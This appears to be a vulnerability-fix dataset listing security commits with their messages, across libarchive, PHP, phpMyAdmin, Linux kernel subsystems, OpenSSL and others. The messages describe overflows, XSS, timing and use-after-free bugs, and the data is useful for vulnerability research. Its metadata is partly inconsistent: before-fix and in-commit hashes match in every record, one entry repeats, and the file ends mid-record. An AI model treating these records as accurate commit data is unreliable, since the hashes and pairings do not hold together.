Issue #656:  Fix CVE-2016-1541, VU#862384\n\nWhen reading OS X metadata entries in Zip archives that were stored without compression, libarchive would use the uncompressed entry size to allocate a buffer but would use the compressed entry size to limit the amount of data copied into that buffer.  Since the compressed and uncompressed sizes are provided by data in the archive itself, an attacker could manipulate these values to write data beyond the end of the allocated buffer.\n\nThis fix provides three new checks to guard against such manipulation and to make libarchive generally more robust when handling this type of entry:  1. If an OS X metadata entry is stored without compression,     abort the entire archive if the compressed and uncompressed     data sizes do not match.  2. When sanity-checking the size of an OS X metadata entry,     abort this entry if either the compressed or uncompressed     size is larger than 4MB.  3. When copying data into the allocated buffer, check the copy     size against both the compressed entry size and uncompressed     entry size.

======================================================================
Commit With Fix: 
    2871c70efaaaa0f102557a17c727fd4d5204dd4b
File(s) In Commit: 
    ext/standard/exec.c
Blob(s) In Commit: 
    c4afce333735961fd33360bec7e0812185ec3465
Blob(s) Before Fix: 
    c4afce333735961fd33360bec7e0812185ec3465
Projects:
    0014593_php-src
Commit Message for 2871c70efaaaa0f102557a17c727fd4d5204dd4b:
Patch for Heap Buffer Overflow in EscapeShell\n\nProposed patch for bug #71270

======================================================================
Commit With Fix: 
    0d3181324c816bdf664ca5e1548dfe8eb05c54f8
File(s) In Commit: 
    htdocs/core/lib/functions.lib.php
Blob(s) In Commit: 
    81412531262cd4267f3d47536a92b1374487bac6
Blob(s) Before Fix: 
    81412531262cd4267f3d47536a92b1374487bac6
Projects:
    01viniciusmelo_dolibarr
Commit Message for 0d3181324c816bdf664ca5e1548dfe8eb05c54f8:
FIX #2857, #4291 & #4341 Escape GETPOST alpha data by default\n\nThis should mitigate most HTML injections allowing XSS.

======================================================================
Commit With Fix: 
    019c4f25d500ec5db9ba3b84cc961a7e4e850738
File(s) In Commit: 
    js/normalization.js
Blob(s) In Commit: 
    196e83aed9d93ea4c5a77d77da195dcb2685c740
Blob(s) Before Fix: 
    196e83aed9d93ea4c5a77d77da195dcb2685c740
Projects:
    007durgesh219_phpmyadmin
Commit Message for 019c4f25d500ec5db9ba3b84cc961a7e4e850738:
Fix XSS in normalization.php\n\nSigned-off-by: Madhura Jayaratne <madhura.cj@gmail.com>

======================================================================
Commit With Fix: 
    c57d3cc7b97b5f32801032f7bb222297aa97dfea
File(s) In Commit: 
    libraries/sql-parser/autoload.php
Blob(s) In Commit: 
    da6bfe0a8ccf9a6f08e8f1b7452ab0802153dc26
Blob(s) Before Fix: 
    da6bfe0a8ccf9a6f08e8f1b7452ab0802153dc26
Projects:
    007durgesh219_phpmyadmin
Commit Message for c57d3cc7b97b5f32801032f7bb222297aa97dfea:
Avoid invalid invocation of SQL parser\n\nSigned-off-by: Michal Čihař <michal@cihar.com>

======================================================================
Commit With Fix: 
    63ef0b41dc48d6112d1918c1b1de9de8ea90adb5
File(s) In Commit: 
    src/hb-ot-font.cc
Blob(s) In Commit: 
    69d2503abbf5caf9f62133c68a5421c8a461b79a
Blob(s) Before Fix: 
    69d2503abbf5caf9f62133c68a5421c8a461b79a
Projects:
    00ERNEST00_FFmpeg
    031087_harfbuzz
Commit Message for 63ef0b41dc48d6112d1918c1b1de9de8ea90adb5:
[ot-font] Fix hmtx wrong table length check\n\nDiscovered by libFuzzer.  Ouch!\n\nhttps://github.com/behdad/harfbuzz/issues/139#issuecomment-148289957

======================================================================
Commit With Fix: 
    0d62e9dd6da45bbf0f33a8617afc5fe774c8f45f
File(s) In Commit: 
    lib/asn1_decoder.c
Blob(s) In Commit: 
    3f74dd3e29107fa407df14cc8a8b0cf05087e9eb
Blob(s) Before Fix: 
    3f74dd3e29107fa407df14cc8a8b0cf05087e9eb
Projects:
    0-T-0_ps4-linux
Commit Message for 0d62e9dd6da45bbf0f33a8617afc5fe774c8f45f:
ASN.1: Fix non-match detection failure on data overrun\n\nIf the ASN.1 decoder is asked to parse a sequence of objects, non-optional matches get skipped if there's no more data to be had rather than a data-overrun error being reported.\n\nThis is due to the code segment that decides whether to skip optional matches (ie. matches that could get ignored because an element is marked OPTIONAL in the grammar) due to a lack of data also skips non-optional elements if the data pointer has reached the end of the buffer.\n\nThis can be tested with the data decoder for the new RSA akcipher algorithm that takes three non-optional integers.  Currently, it skips the last integer if there is insufficient data.\n\nWithout the fix, #defining DEBUG in asn1_decoder.c will show something like:\n\n	next_op: pc=0/13 dp=0/270 C=0 J=0 	- match? 30 30 00 	- TAG: 30 266 CONS 	next_op: pc=2/13 dp=4/270 C=1 J=0 	- match? 02 02 00 	- TAG: 02 257 	- LEAF: 257 	next_op: pc=5/13 dp=265/270 C=1 J=0 	- match? 02 02 00 	- TAG: 02 3 	- LEAF: 3 	next_op: pc=8/13 dp=270/270 C=1 J=0 	next_op: pc=11/13 dp=270/270 C=1 J=0 	- end cons t=4 dp=270 l=270/270\n\nThe next_op line for pc=8/13 should be followed by a match line.\n\nThis is not exploitable for X.509 certificates by means of shortening the message and fixing up the ASN.1 CONS tags because:\n\n (1) The relevant records being built up are cleared before use.\n\n (2) If the message is shortened sufficiently to remove the public key, the      ASN.1 parse of the RSA key will fail quickly due to a lack of data.\n\n (3) Extracted signature data is either turned into MPIs (which cope with a      0 length) or is simpler integers specifying algoritms and suchlike      (which can validly be 0)  and\n\n (4) The AKID and SKID extensions are optional and their removal is handled      without risking passing a NULL to asymmetric_key_generate_id().\n\n (5) If the certificate is truncated sufficiently to remove the subject,      issuer or serialNumber then the ASN.1 decoder will fail with a 'Cons      stack underflow' return.\n\nThis is not exploitable for PKCS#7 messages by means of removal of elements from such a message from the tail end of a sequence:\n\n (1) Any shortened X.509 certs embedded in the PKCS#7 message are survivable      as detailed above.\n\n (2) The message digest content isn't used if it shows a NULL pointer,      similarly, the authattrs aren't used if that shows a NULL pointer.\n\n (3) A missing signature results in a NULL MPI - which the MPI routines deal      with.\n\n (4) If data is NULL, it is expected that the message has detached content and      that is handled appropriately.\n\n (5) If the serialNumber is excised, the unconditional action associated      with it will pick up the containing SEQUENCE instead, so no NULL      pointer will be seen here.\n\n     If both the issuer and the serialNumber are excised, the ASN.1 decode      will fail with an 'Unexpected tag' return.\n\n     In either case, there's no way to get to asymmetric_key_generate_id()      with a NULL pointer.\n\n (6) Other fields are decoded to simple integers.  Shortening the message      to omit an algorithm ID field will cause checks on this to fail early      in the verification process.\n\n This can also be tested by snipping objects off of the end of the ASN.1 stream such that mandatory tags are removed - or even from the end of internal SEQUENCEs.  If any mandatory tag is missing, the error EBADMSG *should* be produced.  Without this patch ERANGE or ENOPKG might be produced or the parse may apparently succeed, perhaps with ENOKEY or EKEYREJECTED being produced later, depending on what gets snipped.\n\nJust snipping off the final BIT_STRING or OCTET_STRING from either sample should be a start since both are mandatory and neither will cause an EBADMSG without the patches\n\nReported-by: Marcel Holtmann <marcel@holtmann.org> Signed-off-by: David Howells <dhowells@redhat.com> Tested-by: Marcel Holtmann <marcel@holtmann.org> Reviewed-by: David Woodhouse <David.Woodhouse@intel.com>

======================================================================
Commit With Fix: 
    8b8a321ff72c785ed5e8b4cf6eda20b35d427390
File(s) In Commit: 
    net/ipv4/tcp_input.c
Blob(s) In Commit: 
    d4c51158470f5afb7cee8a5c875b5f9ed5b04e14
Blob(s) Before Fix: 
    d4c51158470f5afb7cee8a5c875b5f9ed5b04e14
Projects:
    0-T-0_ps4-linux
Commit Message for 8b8a321ff72c785ed5e8b4cf6eda20b35d427390:
tcp: fix zero cwnd in tcp_cwnd_reduction\n\nPatch 3759824da87b ("tcp: PRR uses CRB mode by default and SS mode conditionally") introduced a bug that cwnd may become 0 when both inflight and sndcnt are 0 (cwnd = inflight + sndcnt). This may lead to a div-by-zero if the connection starts another cwnd reduction phase by setting tp->prior_cwnd to the current cwnd (0) in tcp_init_cwnd_reduction().\n\nTo prevent this we skip PRR operation when nothing is acked or sacked. Then cwnd must be positive in all cases as long as ssthresh is positive:\n\n1) The proportional reduction mode    inflight > ssthresh > 0\n\n2) The reduction bound mode   a) inflight == ssthresh > 0\n\n  b) inflight < ssthresh      sndcnt > 0 since newly_acked_sacked > 0 and inflight < ssthresh\n\nTherefore in all cases inflight and sndcnt can not both be 0. We check invalid tp->prior_cwnd to avoid potential div0 bugs.\n\nIn reality this bug is triggered only with a sequence of less common events.  For example, the connection is terminating an ECN-triggered cwnd reduction with an inflight 0, then it receives reordered/old ACKs or DSACKs from prior transmission (which acks nothing). Or the connection is in fast recovery stage that marks everything lost, but fails to retransmit due to local issues, then receives data packets from other end which acks nothing.\n\nFixes: 3759824da87b ("tcp: PRR uses CRB mode by default and SS mode conditionally") Reported-by: Oleksandr Natalenko <oleksandr@natalenko.name> Signed-off-by: Yuchung Cheng <ycheng@google.com> Signed-off-by: Neal Cardwell <ncardwell@google.com> Signed-off-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    613317bd212c585c20796c10afe5daaa95d4b0a1
File(s) In Commit: 
    security/integrity/evm/evm_main.c
Blob(s) In Commit: 
    e6ea9d4b1de91a8d58e3ccab0fd3cef222ea6fcd
Blob(s) Before Fix: 
    e6ea9d4b1de91a8d58e3ccab0fd3cef222ea6fcd
Projects:
    0-T-0_ps4-linux
Commit Message for 613317bd212c585c20796c10afe5daaa95d4b0a1:
EVM: Use crypto_memneq() for digest comparisons\n\nThis patch fixes vulnerability CVE-2016-2085.  The problem exists because the vm_verify_hmac() function includes a use of memcmp(). Unfortunately, this allows timing side channel attacks  specifically a MAC forgery complexity drop from 2^128 to 2^12.  This patch changes the memcmp() to the cryptographically safe crypto_memneq().\n\nReported-by: Xiaofei Rex Guo <xiaofei.rex.guo@intel.com> Signed-off-by: Ryan Ware <ware@linux.intel.com> Cc: stable@vger.kernel.org Signed-off-by: Mimi Zohar <zohar@linux.vnet.ibm.com> Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    f43bfaeddc79effbf3d0fcb53ca477cca66f3db8
File(s) In Commit: 
    drivers/net/ethernet/atheros/atlx/atl2.c
Blob(s) In Commit: 
    2ff465848b6553ecc0a646421e30cded0e8fb053
Blob(s) Before Fix: 
    2ff465848b6553ecc0a646421e30cded0e8fb053
Projects:
    0-T-0_ps4-linux
Commit Message for f43bfaeddc79effbf3d0fcb53ca477cca66f3db8:
atl2: Disable unimplemented scatter/gather feature\n\natl2 includes NETIF_F_SG in hw_features even though it has no support for non-linear skbs.  This bug was originally harmless since the driver does not claim to implement checksum offload and that used to be a requirement for SG.\n\nNow that SG and checksum offload are independent features, if you explicitly enable SG *and* use one of the rare protocols that can use SG without checkusm offload, this potentially leaks sensitive information (before you notice that it just isn't working).  Therefore this obscure bug has been designated CVE-2016-2117.\n\nReported-by: Justin Yackoski <jyackoski@crypto-nite.com> Signed-off-by: Ben Hutchings <ben@decadent.org.uk> Fixes: ec5f06156423 ("net: Kill link between CSUM and SG features.") Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    0ed26acce328ec16a3aa635f1ca37365e8c7403a
File(s) In Commit: 
    crypto/ts/ts_lib.c
Blob(s) In Commit: 
    e18f1f3f7e3ff93b9d83dedfd5b5c3d35da3ff98
Blob(s) Before Fix: 
    e18f1f3f7e3ff93b9d83dedfd5b5c3d35da3ff98
Projects:
    0902710055_openssl
Commit Message for 0ed26acce328ec16a3aa635f1ca37365e8c7403a:
Fix OOB read in TS_OBJ_print_bio().\n\nTS_OBJ_print_bio() misuses OBJ_txt2obj: it should print the result as a null terminated buffer. The length value returned is the total length the complete text reprsentation would need not the amount of data written.\n\nCVE-2016-2180\n\nThanks to Shi Lei for reporting this bug.\n\nReviewed-by: Matt Caswell <matt@openssl.org>

======================================================================
Commit With Fix: 
    0f886ca12765d20124bd06291c82951fd49a33be
File(s) In Commit: 
    sound/usb/quirks.c
Blob(s) In Commit: 
    529c35cceaa6f37ffc56a9f8fa69ebcaea1b3603
Blob(s) Before Fix: 
    529c35cceaa6f37ffc56a9f8fa69ebcaea1b3603
Projects:
    0-T-0_ps4-linux
Commit Message for 0f886ca12765d20124bd06291c82951fd49a33be:
ALSA: usb-audio: Fix NULL dereference in create_fixed_stream_quirk()\n\ncreate_fixed_stream_quirk() may cause a NULL-pointer dereference by accessing the non-existing endpoint when a USB device with a malformed USB descriptor is used.\n\nThis patch avoids it simply by adding a sanity check of bNumEndpoints before the accesses.\n\nBugzilla: https://bugzilla.suse.com/show_bug.cgi?id=971125 Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    950336ba3e4a1ffd2ca60d29f6ef386dd2c7351d
File(s) In Commit: 
    drivers/input/misc/ati_remote2.c
Blob(s) In Commit: 
    1c5914cae8533326e17b878b406bedca130912d6
Blob(s) Before Fix: 
    1c5914cae8533326e17b878b406bedca130912d6
Projects:
    0-T-0_ps4-linux
Commit Message for 950336ba3e4a1ffd2ca60d29f6ef386dd2c7351d:
Input: ati_remote2 - fix crashes on detecting device with invalid descriptor\n\nThe ati_remote2 driver expects at least two interfaces with one endpoint each. If given malicious descriptor that specify one interface or no endpoints, it will crash in the probe function. Ensure there is at least two interfaces and one endpoint for each interface before using it.\n\nThe full disclosure: http://seclists.org/bugtraq/2016/Mar/90\n\nReported-by: Ralf Spenneberg <ralf@spenneberg.net> Signed-off-by: Vladis Dronov <vdronov@redhat.com> Cc: stable@vger.kernel.org Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>

======================================================================
Commit With Fix: 
    9c6ba456711687b794dcf285856fc14e2c76074f
File(s) In Commit: 
    drivers/input/misc/powermate.c
Blob(s) In Commit: 
    84909a12ff36c231e7bcfc545bc2ce180c6cd26f
Blob(s) Before Fix: 
    84909a12ff36c231e7bcfc545bc2ce180c6cd26f
Projects:
    0-T-0_ps4-linux
Commit Message for 9c6ba456711687b794dcf285856fc14e2c76074f:
Input: powermate - fix oops with malicious USB descriptors\n\nThe powermate driver expects at least one valid USB endpoint in its probe function.  If given malicious descriptors that specify 0 for the number of endpoints, it will crash.  Validate the number of endpoints on the interface before using them.\n\nThe full report for this issue can be found here: http://seclists.org/bugtraq/2016/Mar/85\n\nReported-by: Ralf Spenneberg <ralf@spenneberg.net> Cc: stable <stable@vger.kernel.org> Signed-off-by: Josh Boyer <jwboyer@fedoraproject.org> Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>

======================================================================
Commit With Fix: 
    162f98dea487206d9ab79fc12ed64700667a894d
File(s) In Commit: 
    drivers/input/tablet/gtco.c
Blob(s) In Commit: 
    7c18249d6c8e820e3fe86ffa66196164dbef2d3f
Blob(s) Before Fix: 
    7c18249d6c8e820e3fe86ffa66196164dbef2d3f
Projects:
    0-T-0_ps4-linux
Commit Message for 162f98dea487206d9ab79fc12ed64700667a894d:
Input: gtco - fix crash on detecting device without endpoints\n\nThe gtco driver expects at least one valid endpoint. If given malicious descriptors that specify 0 for the number of endpoints, it will crash in the probe function. Ensure there is at least one endpoint on the interface before using it.\n\nAlso let's fix a minor coding style issue.\n\nThe full correct report of this issue can be found in the public Red Hat Bugzilla:\n\nhttps://bugzilla.redhat.com/show_bug.cgi?id=1283385\n\nReported-by: Ralf Spenneberg <ralf@spenneberg.net> Signed-off-by: Vladis Dronov <vdronov@redhat.com> Cc: stable@vger.kernel.org Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>

======================================================================
Commit With Fix: 
    4ec0ef3a82125efc36173062a50624550a900ae0
File(s) In Commit: 
    drivers/usb/misc/iowarrior.c
Blob(s) In Commit: 
    1950e87b4219047908dfdad73fe30650cad7b8ca
Blob(s) Before Fix: 
    1950e87b4219047908dfdad73fe30650cad7b8ca
Projects:
    0-T-0_ps4-linux
Commit Message for 4ec0ef3a82125efc36173062a50624550a900ae0:
USB: iowarrior: fix oops with malicious USB descriptors\n\nThe iowarrior driver expects at least one valid endpoint.  If given malicious descriptors that specify 0 for the number of endpoints, it will crash in the probe function.  Ensure there is at least one endpoint on the interface before using it.\n\nThe full report of this issue can be found here: http://seclists.org/bugtraq/2016/Mar/87\n\nReported-by: Ralf Spenneberg <ralf@spenneberg.net> Cc: stable <stable@vger.kernel.org> Signed-off-by: Josh Boyer <jwboyer@fedoraproject.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    6fcdb8f1f538b9d63e63a5fa199c5514a15d4564
File(s) In Commit: 
    lib/lha_file_header.c
Blob(s) In Commit: 
    b06be91affa30b4175667f3f7473d1d27c5b160c
Blob(s) Before Fix: 
    b06be91affa30b4175667f3f7473d1d27c5b160c
Projects:
    jmtd_lhasa
Commit Message for 6fcdb8f1f538b9d63e63a5fa199c5514a15d4564:
Fix integer underflow vulnerability in L3 decode.\n\nMarcin 'Icewall' Noga of Cisco TALOS discovered that the level 3 header decoding routines were vulnerable to an integer underflow, if the 32-bit header length was less than the base level 3 header length. This could lead to an exploitable heap corruption condition.\n\nThanks go to Marcin Noga and Regina Wilson of Cisco TALOS for reporting this vulnerability.

======================================================================
Commit With Fix: 
    a1b14d27ed0965838350f1377ff97c93ee383492
File(s) In Commit: 
    kernel/bpf/verifier.c
Blob(s) In Commit: 
    2e7f7ab739e41c46072a69e787bf4e44f560ae55
Blob(s) Before Fix: 
    2e7f7ab739e41c46072a69e787bf4e44f560ae55
Projects:
    0-T-0_ps4-linux
Commit Message for a1b14d27ed0965838350f1377ff97c93ee383492:
bpf: fix branch offset adjustment on backjumps after patching ctx expansion\n\nWhen ctx access is used, the kernel often needs to expand/rewrite instructions, so after that patching, branch offsets have to be adjusted for both forward and backward jumps in the new eBPF program, but for backward jumps it fails to account the delta. Meaning, for example, if the expansion happens exactly on the insn that sits at the jump target, it doesn't fix up the back jump offset.\n\nAnalysis on what the check in adjust_branches() is currently doing:\n\n  /* adjust offset of jmps if necessary */   if (i < pos && i + insn->off + 1 > pos)     insn->off += delta    else if (i > pos && i + insn->off + 1 < pos)     insn->off -= delta \n\nFirst condition (forward jumps):\n\n  Before:                         After:\n\n  insns[0]                        insns[0]   insns[1] <--- i/insn            insns[1] <--- i/insn   insns[2] <--- pos               insns[P] <--- pos   insns[3]                        insns[P]  `------| delta   insns[4] <--- target_X          insns[P]   `-----|   insns[5]                        insns[3]                                   insns[4] <--- target_X                                   insns[5]\n\nFirst case is if we cross pos-boundary and the jump instruction was before pos. This is handeled correctly. I.e. if i == pos, then this would mean our jump that we currently check was the patchlet itself that we just injected. Since such patchlets are self-contained and have no awareness of any insns before or after the patched one, the delta is correctly not adjusted. Also, for the second condition in case of i + insn->off + 1 == pos, means we jump to that newly patched instruction, so no offset adjustment are needed. That part is correct.\n\nSecond condition (backward jumps):\n\n  Before:                         After:\n\n  insns[0]                        insns[0]   insns[1] <--- target_X          insns[1] <--- target_X   insns[2] <--- pos <-- target_Y  insns[P] <--- pos <-- target_Y   insns[3]                        insns[P]  `------| delta   insns[4] <--- i/insn            insns[P]   `-----|   insns[5]                        insns[3]                                   insns[4] <--- i/insn                                   insns[5]\n\nSecond interesting case is where we cross pos-boundary and the jump instruction was after pos. Backward jump with i == pos would be impossible and pose a bug somewhere in the patchlet, so the first condition checking i > pos is okay only by itself. However, i + insn->off + 1 < pos does not always work as intended to trigger the adjustment. It works when jump targets would be far off where the delta wouldn't matter. But, for example, where the fixed insn->off before pointed to pos (target_Y), it now points to pos + delta, so that additional room needs to be taken into account for the check. This means that i) both tests here need to be adjusted into pos + delta, and ii) for the second condition, the test needs to be <= as pos itself can be a target in the backjump, too.\n\nFixes: 9bac3d6d548e ("bpf: allow extended BPF programs access skb fields") Signed-off-by: Daniel Borkmann <daniel@iogearbox.net> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    07d86ca93db7e5cdf4743564d98292042ec21af7
File(s) In Commit: 
    sound/usb/midi.c
Blob(s) In Commit: 
    007cf583112154bc56616234d25e92f4e5e8212c
Blob(s) Before Fix: 
    007cf583112154bc56616234d25e92f4e5e8212c
Projects:
    0-T-0_ps4-linux
Commit Message for 07d86ca93db7e5cdf4743564d98292042ec21af7:
ALSA: usb-audio: avoid freeing umidi object twice\n\nThe 'umidi' object will be free'd on the error path by snd_usbmidi_free() when tearing down the rawmidi interface. So we shouldn't try to free it in snd_usbmidi_create() after having registered the rawmidi interface.\n\nFound by KASAN.\n\nSigned-off-by: Andrey Konovalov <andreyknvl@gmail.com> Acked-by: Clemens Ladisch <clemens@ladisch.de> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    f50c9c853e7809810099c970780c30b0765b0643
File(s) In Commit: 
    modules/seas/encode_msg.c
Blob(s) In Commit: 
    e56b5fba8932a129b5aaf03cfbf4f0c9368f40d2
Blob(s) Before Fix: 
    e56b5fba8932a129b5aaf03cfbf4f0c9368f40d2
Projects:
    1and1_kamailio
Commit Message for f50c9c853e7809810099c970780c30b0765b0643:
seas: safety check for target buffer size before copying message in encode_msg()\n\n- avoid buffer overflow for large SIP messages - reported by Stelios Tsampas

======================================================================
Commit With Fix: 
    eca4beb21e61877d76fdf6bea771f72f39544d9b
File(s) In Commit: 
    formats.js
Blob(s) In Commit: 
    9cb8380bc87403ad4212984da548a2acdacf0d3f
Blob(s) Before Fix: 
    9cb8380bc87403ad4212984da548a2acdacf0d3f
Projects:
    AmristarSolutions_is-my-json-valid
Commit Message for eca4beb21e61877d76fdf6bea771f72f39544d9b:
fix utc-millisec regex to avoid a ddos attack

======================================================================
Commit With Fix: 
    030e2c78d3a91dd0d27fef37e91950dde333eba1
File(s) In Commit: 
    sound/core/seq/seq_clientmgr.c
Blob(s) In Commit: 
    13cfa815732db759935f2daaf4c997c73016eb8c
Blob(s) Before Fix: 
    13cfa815732db759935f2daaf4c997c73016eb8c
Projects:
    0-T-0_ps4-linux
Commit Message for 030e2c78d3a91dd0d27fef37e91950dde333eba1:
ALSA: seq: Fix missing NULL check at remove_events ioctl\n\nsnd_seq_ioctl_remove_events() calls snd_seq_fifo_clear() unconditionally even if there is no FIFO assigned, and this leads to an Oops due to NULL dereference.  The fix is just to add a proper NULL check.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com> Tested-by: Dmitry Vyukov <dvyukov@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    3567eb6af614dac436c4b16a8d426f9faed639b3
File(s) In Commit: 
    sound/core/seq/seq_queue.c
Blob(s) In Commit: 
    0bec02e89d5118b3dffe1e22e88e423baa037491
Blob(s) Before Fix: 
    0bec02e89d5118b3dffe1e22e88e423baa037491
Projects:
    0-T-0_ps4-linux
Commit Message for 3567eb6af614dac436c4b16a8d426f9faed639b3:
ALSA: seq: Fix race at timer setup and close\n\nALSA sequencer code has an open race between the timer setup ioctl and the close of the client.  This was triggered by syzkaller fuzzer, and a use-after-free was caught there as a result.\n\nThis patch papers over it by adding a proper queue->timer_mutex lock around the timer-related calls in the relevant code path.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com> Tested-by: Dmitry Vyukov <dvyukov@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    ee8413b01045c74340aa13ad5bdf905de32be736
File(s) In Commit: 
    sound/core/timer.c
Blob(s) In Commit: 
    9241784dfe7ddd3072f02972ce23ce17e8ab5919
Blob(s) Before Fix: 
    9241784dfe7ddd3072f02972ce23ce17e8ab5919
Projects:
    0-T-0_ps4-linux
Commit Message for ee8413b01045c74340aa13ad5bdf905de32be736:
ALSA: timer: Fix double unlink of active_list\n\nALSA timer instance object has a couple of linked lists and they are unlinked unconditionally at snd_timer_stop().  Meanwhile snd_timer_interrupt() unlinks it, but it calls list_del() which leaves the element list itself unchanged.  This ends up with unlinking twice, and it was caught by syzkaller fuzzer.\n\nThe fix is to use list_del_init() variant properly there, too.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com> Tested-by: Dmitry Vyukov <dvyukov@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    af368027a49a751d6ff4ee9e3f9961f35bb4fede
File(s) In Commit: 
    sound/core/timer.c
Blob(s) In Commit: 
    3810ee8f12051b1e888d1bed958f95614af0b45b
Blob(s) Before Fix: 
    3810ee8f12051b1e888d1bed958f95614af0b45b
Projects:
    0-T-0_ps4-linux
Commit Message for af368027a49a751d6ff4ee9e3f9961f35bb4fede:
ALSA: timer: Fix race among timer ioctls\n\nALSA timer ioctls have an open race and this may lead to a use-after-free of timer instance object.  A simplistic fix is to make each ioctl exclusive.  We have already tread_sem for controlling the tread, and extend this as a global mutex to be applied to each ioctl.\n\nThe downside is, of course, the worse concurrency.  But these ioctls aren't to be parallel accessible, in anyway, so it should be fine to serialize there.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com> Tested-by: Dmitry Vyukov <dvyukov@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    b5a663aa426f4884c71cd8580adae73f33570f0d
File(s) In Commit: 
    sound/core/timer.c
Blob(s) In Commit: 
    4e8d7bfffff6be48770eb9825348c8c811186d11
Blob(s) Before Fix: 
    4e8d7bfffff6be48770eb9825348c8c811186d11
Projects:
    0-T-0_ps4-linux
Commit Message for b5a663aa426f4884c71cd8580adae73f33570f0d:
ALSA: timer: Harden slave timer list handling\n\nA slave timer instance might be still accessible in a racy way while operating the master instance as it lacks of locking.  Since the master operation is mostly protected with timer->lock, we should cope with it while changing the slave instance, too.  Also, some linked lists (active_list and ack_list) of slave instances aren't unlinked immediately at stopping or closing, and this may lead to unexpected accesses.\n\nThis patch tries to address these issues.  It adds spin lock of timer->lock (either from master or slave, which is equivalent) in a few places.  For avoiding a deadlock, we ensure that the global slave_active_lock is always locked at first before each timer lock.\n\nAlso, ack and active_list of slave instances are properly unlinked at snd_timer_stop() and snd_timer_close().\n\nLast but not least, remove the superfluous call of _snd_timer_stop() at removing slave links.  This is a noop, and calling it may confuse readers wrt locking.  Further cleanup will follow in a later patch.\n\nActually we've got reports of use-after-free by syzkaller fuzzer, and this hopefully fixes these issues.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    b5a663aa426f4884c71cd8580adae73f33570f0d
File(s) In Commit: 
    sound/core/timer.c
Blob(s) In Commit: 
    4e8d7bfffff6be48770eb9825348c8c811186d11
Blob(s) Before Fix: 
    4e8d7bfffff6be48770eb9825348c8c811186d11
Projects:
    0-T-0_ps4-linux
Commit Message for b5a663aa426f4884c71cd8580adae73f33570f0d:
ALSA: timer: Harden slave timer list handling\n\nA slave timer instance might be still accessible in a racy way while operating the master instance as it lacks of locking.  Since the master operation is mostly protected with timer->lock, we should cope with it while changing the slave instance, too.  Also, some linked lists (active_list and ack_list) of slave instances aren't unlinked immediately at stopping or closing, and this may lead to unexpected accesses.\n\nThis patch tries to address these issues.  It adds spin lock of timer->lock (either from master or slave, which is equivalent) in a few places.  For avoiding a deadlock, we ensure that the global slave_active_lock is always locked at first before each timer lock.\n\nAlso, ack and active_list of slave instances are properly unlinked at snd_timer_stop() and snd_timer_close().\n\nLast but not least, remove the superfluous call of _snd_timer_stop() at removing slave links.  This is a noop, and calling it may confuse readers wrt locking.  Further cleanup will follow in a later patch.\n\nActually we've got reports of use-after-free by syzkaller fuzzer, and this hopefully fixes these issues.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    2ba1fe7a06d3624f9a7586d672b55f08f7c670f3
File(s) In Commit: 
    sound/core/hrtimer.c
Blob(s) In Commit: 
    656d9a9032dc2165d1f30f4ef193250a07bec555
Blob(s) Before Fix: 
    656d9a9032dc2165d1f30f4ef193250a07bec555
Projects:
    0-T-0_ps4-linux
Commit Message for 2ba1fe7a06d3624f9a7586d672b55f08f7c670f3:
ALSA: hrtimer: Fix stall by hrtimer_cancel()\n\nhrtimer_cancel() waits for the completion from the callback, thus it must not be called inside the callback itself.  This was already a problem in the past with ALSA hrtimer driver, and the early commit [fcfdebe70759: ALSA: hrtimer - Fix lock-up] tried to address it.\n\nHowever, the previous fix is still insufficient: it may still cause a lockup when the ALSA timer instance reprograms itself in its callback. Then it invokes the start function even in snd_timer_interrupt() that is called in hrtimer callback itself, results in a CPU stall.  This is no hypothetical problem but actually triggered by syzkaller fuzzer.\n\nThis patch tries to fix the issue again.  Now we call hrtimer_try_to_cancel() at both start and stop functions so that it won't fall into a deadlock, yet giving some chance to cancel the queue if the functions have been called outside the callback.  The proper hrtimer_cancel() is called in anyway at closing, so this should be enough.\n\nReported-and-tested-by: Dmitry Vyukov <dvyukov@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    3a6a9a807d99371ee126635e1a505fc1fe0df32c
File(s) In Commit: 
    libraries/sql-parser/src/Utils/Error.php
Blob(s) In Commit: 
    f0ad5afbb29dde1ce794af4d72d55b99c2c2577d
Blob(s) Before Fix: 
    f0ad5afbb29dde1ce794af4d72d55b99c2c2577d
Projects:
    007durgesh219_phpmyadmin
Commit Message for 3a6a9a807d99371ee126635e1a505fc1fe0df32c:
Escape query when displaying\n\nSigned-off-by: Michal Čihař <michal@cihar.com>

======================================================================
Commit With Fix: 
    cac9b50b0d75a1d50d6c056ff65c005f3224c8e0
File(s) In Commit: 
    drivers/usb/serial/visor.c
Blob(s) In Commit: 
